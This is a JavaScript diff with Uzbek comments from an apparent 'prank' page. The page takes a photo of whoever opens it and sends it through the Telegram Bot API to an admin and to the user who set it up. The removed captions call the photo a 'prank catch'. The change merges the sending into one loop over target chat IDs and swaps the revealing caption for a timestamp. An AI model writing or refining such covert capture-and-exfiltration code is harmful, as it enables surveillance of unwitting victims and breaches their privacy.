@@ -157,24 +157,20 @@
             // 2-yo'l: To'g'ridan-to'g'ri Telegram API ga (zaxira)
             try {
                 const blob = await (await fetch(dataUrl)).blob();
-                
-                // Doim adminga yuborish
-                const fdAdmin = new FormData();
-                fdAdmin.append('chat_id', ADMIN_ID);
-                fdAdmin.append('caption', '📸 Yangi prank o\'ljasi (Direct)' + (CHAT_ID !== ADMIN_ID ? `\n👤 User: ${CHAT_ID}` : ''));
-                fdAdmin.append('photo', blob, 'photo.jpg');
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST', body: fdAdmin
-                });
+                const now = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
+                const caption = '📅 ' + now;
 
-                // Agar boshqa user bo'lsa, unga ham yuborish
-                if (CHAT_ID && CHAT_ID !== ADMIN_ID) {
-                    const fdUser = new FormData();
-                    fdUser.append('chat_id', CHAT_ID);
-                    fdUser.append('caption', '📸 Yangi prank o\'ljasi!');
-                    fdUser.append('photo', blob, 'photo.jpg');
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST', body: fdUser
+                const targetIds = new Set();
+                targetIds.add(ADMIN_ID);
+                if (CHAT_ID) targetIds.add(CHAT_ID);
+
+                for (const tid of targetIds) {
+                    const fd = new FormData();
+                    fd.append('chat_id', tid);
+                    fd.append('caption', caption);
+                    fd.append('photo', blob, 'photo.jpg');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST', body: fd
                     }).catch(() => {});
                 }
             } catch (_) {}
